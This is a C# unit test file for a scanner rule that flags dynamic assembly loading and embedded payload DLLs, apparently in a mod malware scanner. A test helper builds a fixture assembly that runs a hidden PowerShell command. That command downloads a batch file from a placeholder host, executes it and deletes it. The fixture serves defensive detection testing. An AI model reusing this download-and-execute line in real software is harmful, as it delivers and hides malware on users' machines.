using FluentAssertions;
using System.IO.Compression;
using MLVScan.Models;
using MLVScan.Models.Rules;
using MLVScan.Services;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Xunit;

namespace MLVScan.Core.Tests.Unit.Rules;

public class AssemblyDynamicLoadRuleBranchTests
{
    private readonly AssemblyDynamicLoadRule _rule = new();

    [Fact]
    public void AnalyzeContextualPattern_LoadStringUnsafeNameAndLowScore_IsSuppressedBySeverityThreshold()
    {
        var loadString = CreateMethodReference("System.Reflection", "Assembly", "Load", "System.String");
        var instructions = new Mono.Collections.Generic.Collection<Instruction>
        {
            Instruction.Create(OpCodes.Ldstr, "folder/bad-name"),
            Instruction.Create(OpCodes.Call, loadString)
        };

        var findings = _rule.AnalyzeContextualPattern(loadString, instructions, 1, new MethodSignals()).ToList();

        findings.Should().BeEmpty();
    }

    [Fact]
    public void AnalyzeContextualPattern_ResourceSourceWithoutName_PostAnalysisRefineSkipsPending()
    {
        var loadBytes = CreateMethodReference("System.Reflection", "Assembly", "Load", "System.Byte[]");
        var getResource = CreateMethodReference("System.Reflection", "Assembly", "GetManifestResourceStream", "System.String");
        var instructions = new Mono.Collections.Generic.Collection<Instruction>
        {
            Instruction.Create(OpCodes.Call, getResource),
            Instruction.Create(OpCodes.Call, loadBytes)
        };

        var initial = _rule.AnalyzeContextualPattern(loadBytes, instructions, 1, new MethodSignals()).ToList();
        var module = CreateAssembly("OuterModule").MainModule;

        var refined = _rule.PostAnalysisRefine(module, initial).ToList();

        initial.Should().ContainSingle();
        refined.Should().BeEmpty();
    }

    [Fact]
    public void PostAnalysisRefine_WithSuspiciousEmbeddedAssembly_ReturnsBoostedFinding()
    {
        const string resourceName = "payload.dll";
        var outerAssembly = CreateAssembly("Outer");
        var outerModule = outerAssembly.MainModule;
        outerModule.Resources.Add(new EmbeddedResource(resourceName, Mono.Cecil.ManifestResourceAttributes.Private, BuildInnerAssemblyBytesWithProcessStart()));

        var loadBytes = CreateMethodReference("System.Reflection", "Assembly", "Load", outerModule, "System.Byte[]");
        var getResource = CreateMethodReference("System.Reflection", "Assembly", "GetManifestResourceStream", outerModule, "System.String");
        var instructions = new Mono.Collections.Generic.Collection<Instruction>
        {
            Instruction.Create(OpCodes.Ldstr, resourceName),
            Instruction.Create(OpCodes.Call, getResource),
            Instruction.Create(OpCodes.Call, loadBytes)
        };

        _rule.AnalyzeContextualPattern(loadBytes, instructions, 2, new MethodSignals()).ToList();
        var refined = _rule.PostAnalysisRefine(outerModule, Enumerable.Empty<ScanFinding>()).ToList();

        refined.Should().Contain(finding =>
            finding.RuleId == "AssemblyDynamicLoadRule" &&
            finding.Description.Contains("Embedded assembly", StringComparison.Ordinal) &&
            finding.Description.Contains(resourceName, StringComparison.Ordinal) &&
            finding.RiskScore > 50);
        refined.Should().Contain(finding =>
            finding.RuleId == "ProcessStartRule" &&
            finding.Location.Contains($"Embedded resource '{resourceName}'", StringComparison.Ordinal) &&
            finding.Description.Contains("powershell.exe", StringComparison.OrdinalIgnoreCase) &&
            finding.Description.Contains("dl.bat", StringComparison.OrdinalIgnoreCase) &&
            finding.BypassCompanionCheck);
    }

    [Fact]
    public void PostAnalysisRefine_WhenRecursiveScanningDisabled_SkipsEmbeddedAssembly()
    {
        const string resourceName = "payload.dll";
        var outerAssembly = CreateAssembly("DisabledRecursiveScan");
        outerAssembly.MainModule.Resources.Add(new EmbeddedResource(resourceName,
            Mono.Cecil.ManifestResourceAttributes.Private, BuildInnerAssemblyBytesWithProcessStart()));
        QueueEmbeddedResourceLoad(_rule, outerAssembly.MainModule, resourceName);
        _ = new AssemblyScanner([_rule], new ScanConfig { EnableRecursiveResourceScanning = false });

        var refined = _rule.PostAnalysisRefine(outerAssembly.MainModule,
            Enumerable.Empty<ScanFinding>()).ToList();

        refined.Should().BeEmpty();
    }

    [Fact]
    public void PostAnalysisRefine_WhenGzipExpansionExceedsConfiguredLimit_StopsWithoutScanning()
    {
        const string resourceName = "compressed-payload.dll";
        var outerAssembly = CreateAssembly("BoundedRecursiveScan");
        var compressedPayload = BuildOversizedGzipPayload(
            BuildInnerAssemblyBytesWithProcessStart(),
            2 * 1024 * 1024);
        compressedPayload.Length.Should().BeLessThan(1024 * 1024);
        outerAssembly.MainModule.Resources.Add(new EmbeddedResource(resourceName,
            Mono.Cecil.ManifestResourceAttributes.Private, compressedPayload));
        QueueEmbeddedResourceLoad(_rule, outerAssembly.MainModule, resourceName);
        _ = new AssemblyScanner([_rule], new ScanConfig { MaxRecursiveResourceSizeMB = 1 });

        var refined = _rule.PostAnalysisRefine(outerAssembly.MainModule,
            Enumerable.Empty<ScanFinding>()).ToList();

        refined.Should().BeEmpty();
    }

    [Fact]
    public void ClassifyOverloadAndBaseScore_CoversMajorOverloadBranches()
    {
        var classify = GetPrivateStaticMethod("ClassifyOverload");
        var getBaseScore = GetPrivateStaticMethod("GetBaseScore");

        var loadNoParams = CreateMethodReference("System.Reflection", "Assembly", "Load");
        var loadString = CreateMethodReference("System.Reflection", "Assembly", "Load", "System.String");
        var loadAsmName = CreateMethodReference("System.Reflection", "Assembly", "Load", "System.Reflection.AssemblyName");
        var loadFrom = CreateMethodReference("System.Reflection", "Assembly", "LoadFrom", "System.String");
        var loadFile = CreateMethodReference("System.Reflection", "Assembly", "LoadFile", "System.String");
        var alcStream = CreateMethodReference("System.Runtime.Loader", "AssemblyLoadContext", "LoadFromStream", "System.IO.Stream");
        var alcStreamPdb = CreateMethodReference("System.Runtime.Loader", "AssemblyLoadContext", "LoadFromStream", "System.IO.Stream", "System.IO.Stream");
        var alcPath = CreateMethodReference("System.Runtime.Loader", "AssemblyLoadContext", "LoadFromAssemblyPath", "System.String");

        GetBaseScore(getBaseScore, Classify(classify, loadNoParams)).Should().Be(20);
        GetBaseScore(getBaseScore, Classify(classify, loadString)).Should().Be(10);
        GetBaseScore(getBaseScore, Classify(classify, loadAsmName)).Should().Be(10);
        GetBaseScore(getBaseScore, Classify(classify, loadFrom)).Should().Be(30);
        GetBaseScore(getBaseScore, Classify(classify, loadFile)).Should().Be(35);
        GetBaseScore(getBaseScore, Classify(classify, alcStream)).Should().Be(45);
        GetBaseScore(getBaseScore, Classify(classify, alcStreamPdb)).Should().Be(50);
        GetBaseScore(getBaseScore, Classify(classify, alcPath)).Should().Be(30);
    }

    [Fact]
    public void IsSafeAssemblyName_WhitespacePathAndSimpleName_BranchesCovered()
    {
        var isSafe = GetPrivateStaticMethod("IsSafeAssemblyName");

        InvokeBool(isSafe, "").Should().BeFalse();
        InvokeBool(isSafe, "my/mod.dll").Should().BeFalse();
        InvokeBool(isSafe, "System.Xml").Should().BeTrue();
        InvokeBool(isSafe, "CustomPlugin.Core").Should().BeTrue();
    }

    [Fact]
    public void AnalyzeProvenance_WithSignalsAndLiterals_SetsFlagsAndCapsScore()
    {
        var analyze = GetPrivateStaticMethod("AnalyzeProvenance");
        var instructions = new Mono.Collections.Generic.Collection<Instruction>
        {
            Instruction.Create(OpCodes.Callvirt, CreateMethodReference("System.Net", "WebClient", "DownloadData", "System.String")),
            Instruction.Create(OpCodes.Call, CreateMethodReference("System", "Convert", "FromBase64String", "System.String")),
            Instruction.Create(OpCodes.Call, CreateMethodReference("System.Security.Cryptography", "Aes", "Create")),
            Instruction.Create(OpCodes.Call, CreateMethodReference("System.Security.Cryptography", "RijndaelManaged", ".ctor")),
            Instruction.Create(OpCodes.Call, CreateMethodReference("System.IO.Compression", "GZipStream", ".ctor", "System.IO.Stream")),
            Instruction.Create(OpCodes.Ldstr, "payload.dll"),
            Instruction.Create(OpCodes.Call, CreateMethodReference("System.Reflection", "Assembly", "GetManifestResourceStream", "System.String")),
            Instruction.Create(OpCodes.Call, CreateMethodReference("System.IO", "File", "ReadAllBytes", "System.String")),
            Instruction.Create(OpCodes.Call, CreateMethodReference("System.IO", "Path", "GetTempPath")),
            Instruction.Create(OpCodes.Call, CreateMethodReference("System", "Environment", "GetFolderPath", "System.Int32")),
            Instruction.Create(OpCodes.Call, CreateMethodReference("System.IO", "File", "WriteAllBytes", "System.String", "System.Byte[]")),
            Instruction.Create(OpCodes.Ldstr, "https://cdn.example.com/payload"),
            Instruction.Create(OpCodes.Ldstr, "AppData\\Local\\Temp")
        };

        var result = analyze.Invoke(null, new object[] { instructions, instructions.Count })!;

        GetProperty<bool>(result, "HasNetworkSource").Should().BeTrue();
        GetProperty<bool>(result, "HasBase64").Should().BeTrue();
        GetProperty<bool>(result, "HasCrypto").Should().BeTrue();
        GetProperty<bool>(result, "HasCompression").Should().BeTrue();
        GetProperty<bool>(result, "HasResourceSource").Should().BeTrue();
        GetProperty<bool>(result, "HasTempPath").Should().BeTrue();
        GetProperty<bool>(result, "HasSensitivePath").Should().BeTrue();
        GetProperty<bool>(result, "HasWriteThenLoad").Should().BeTrue();
        GetProperty<string>(result, "ResourceName").Should().Be("payload.dll");
        GetProperty<int>(result, "Score").Should().Be(80);
    }

    private static AssemblyDefinition CreateAssembly(string name)
        => AssemblyDefinition.CreateAssembly(new AssemblyNameDefinition(name, new Version(1, 0, 0, 0)), name, ModuleKind.Dll);

    private static MethodReference CreateMethodReference(
        string ns,
        string typeName,
        string methodName,
        params string[] parameterTypeNames)
        => CreateMethodReference(ns, typeName, methodName, module: null, parameterTypeNames);

    private static MethodReference CreateMethodReference(
        string ns,
        string typeName,
        string methodName,
        ModuleDefinition? module,
        params string[] parameterTypeNames)
    {
        var ownerAssembly = module?.Assembly ?? CreateAssembly("MethodRefAsm");
        var ownerModule = module ?? ownerAssembly.MainModule;

        var declaringType = new TypeReference(ns, typeName, ownerModule, ownerModule.TypeSystem.CoreLibrary);
        var method = new MethodReference(methodName, ownerModule.TypeSystem.Void, declaringType);

        foreach (var paramTypeName in parameterTypeNames)
        {
            method.Parameters.Add(new ParameterDefinition(CreateTypeReference(ownerModule, paramTypeName)));
        }

        return method;
    }

    private static TypeReference CreateTypeReference(ModuleDefinition module, string fullName)
    {
        if (fullName == "System.Byte[]")
            return new ArrayType(module.TypeSystem.Byte);
        if (fullName == "System.String")
            return module.TypeSystem.String;
        if (fullName == "System.Int32")
            return module.TypeSystem.Int32;

        var idx = fullName.LastIndexOf('.');
        var ns = idx > 0 ? fullName[..idx] : string.Empty;
        var name = idx > 0 ? fullName[(idx + 1)..] : fullName;
        return new TypeReference(ns, name, module, module.TypeSystem.CoreLibrary);
    }

    private static byte[] BuildInnerAssemblyBytesWithProcessStart()
    {
        var assembly = CreateAssembly("InnerPayload");
        var module = assembly.MainModule;
        var type = new TypeDefinition("Inner", "Payload", Mono.Cecil.TypeAttributes.Public | Mono.Cecil.TypeAttributes.Class, module.TypeSystem.Object);
        module.Types.Add(type);

        var method = new MethodDefinition("Run", Mono.Cecil.MethodAttributes.Public | Mono.Cecil.MethodAttributes.Static, module.TypeSystem.Void)
        {
            Body = new Mono.Cecil.Cil.MethodBody(null!)
        };
        method.Body = new Mono.Cecil.Cil.MethodBody(method);
        type.Methods.Add(method);

        var il = method.Body.GetILProcessor();
        var processStartInfoType = CreateTypeReference(module, "System.Diagnostics.ProcessStartInfo");
        il.Append(il.Create(OpCodes.Newobj, CreateConstructor(processStartInfoType, module)));
        il.Append(il.Create(OpCodes.Dup));
        il.Append(il.Create(OpCodes.Ldstr, "powershell.exe"));
        il.Append(il.Create(OpCodes.Callvirt, CreateInstanceMethod(processStartInfoType, "set_FileName", module.TypeSystem.Void, module.TypeSystem.String)));
        il.Append(il.Create(OpCodes.Dup));
        il.Append(il.Create(
            OpCodes.Ldstr,
            "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"iwr 'https://example.invalid/payload.bat' -out $env:TEMP\\dl.bat -useb; if (Test-Path $env:TEMP\\dl.bat) { Start-Process -NoNewWindow $env:TEMP\\dl.bat; Start-Sleep -Seconds 120; Remove-Item $env:TEMP\\dl.bat -Force }\""));
        il.Append(il.Create(OpCodes.Callvirt, CreateInstanceMethod(processStartInfoType, "set_Arguments", module.TypeSystem.Void, module.TypeSystem.String)));
        il.Append(il.Create(OpCodes.Dup));
        il.Append(il.Create(OpCodes.Ldc_I4_1));
        il.Append(il.Create(OpCodes.Callvirt, CreateInstanceMethod(processStartInfoType, "set_CreateNoWindow", module.TypeSystem.Void, module.TypeSystem.Boolean)));
        il.Append(il.Create(OpCodes.Call, CreateProcessStartInfoStart(module, processStartInfoType)));
        il.Append(il.Create(OpCodes.Pop));
        il.Append(il.Create(OpCodes.Ret));

        using var ms = new MemoryStream();
        assembly.Write(ms);
        return ms.ToArray();
    }

    private static void QueueEmbeddedResourceLoad(
        AssemblyDynamicLoadRule rule,
        ModuleDefinition module,
        string resourceName)
    {
        var loadBytes = CreateMethodReference("System.Reflection", "Assembly", "Load", module, "System.Byte[]");
        var getResource = CreateMethodReference("System.Reflection", "Assembly", "GetManifestResourceStream",
            module, "System.String");
        var instructions = new Mono.Collections.Generic.Collection<Instruction>
        {
            Instruction.Create(OpCodes.Ldstr, resourceName),
            Instruction.Create(OpCodes.Call, getResource),
            Instruction.Create(OpCodes.Call, loadBytes)
        };

        rule.AnalyzeContextualPattern(loadBytes, instructions, 2, new MethodSignals()).ToList();
    }

    private static byte[] BuildOversizedGzipPayload(byte[] payload, int expandedSize)
    {
        expandedSize.Should().BeGreaterThan(payload.Length);
        using var output = new MemoryStream();
        using (var gzip = new GZipStream(output, CompressionLevel.SmallestSize, leaveOpen: true))
        {
            gzip.Write(payload, 0, payload.Length);
            var zeros = new byte[81920];
            int remaining = expandedSize - payload.Length;
            while (remaining > 0)
            {
                int count = Math.Min(remaining, zeros.Length);
                gzip.Write(zeros, 0, count);
                remaining -= count;
            }
        }

        return output.ToArray();
    }

    private static MethodReference CreateProcessStartInfoStart(ModuleDefinition module, TypeReference processStartInfoType)
    {
        var processType = new TypeReference("System.Diagnostics", "Process", module, module.TypeSystem.CoreLibrary);
        var processStart = new MethodReference("Start", processType, processType)
        {
            HasThis = false
        };
        processStart.Parameters.Add(new ParameterDefinition(processStartInfoType));
        return processStart;
    }

    private static MethodReference CreateConstructor(TypeReference declaringType, ModuleDefinition module)
    {
        return new MethodReference(".ctor", module.TypeSystem.Void, declaringType)
        {
            HasThis = true
        };
    }

    private static MethodReference CreateInstanceMethod(
        TypeReference declaringType,
        string methodName,
        TypeReference returnType,
        params TypeReference[] parameterTypes)
    {
        var method = new MethodReference(methodName, returnType, declaringType)
        {
            HasThis = true
        };
        foreach (var parameterType in parameterTypes)
        {
            method.Parameters.Add(new ParameterDefinition(parameterType));
        }

        return method;
    }

    private static global::System.Reflection.MethodInfo GetPrivateStaticMethod(string name)
        => typeof(AssemblyDynamicLoadRule).GetMethod(name, global::System.Reflection.BindingFlags.NonPublic | global::System.Reflection.BindingFlags.Static)!;

    private static object Classify(global::System.Reflection.MethodInfo classifyMethod, MethodReference methodRef)
        => classifyMethod.Invoke(null, new object[] { methodRef })!;

    private static int GetBaseScore(global::System.Reflection.MethodInfo getBaseScoreMethod, object overload)
        => (int)getBaseScoreMethod.Invoke(null, new[] { overload })!;

    private static bool InvokeBool(global::System.Reflection.MethodInfo method, string value)
        => (bool)method.Invoke(null, new object[] { value })!;

    private static T GetProperty<T>(object instance, string propertyName)
        => (T)instance.GetType().GetProperty(propertyName)!.GetValue(instance)!;
}
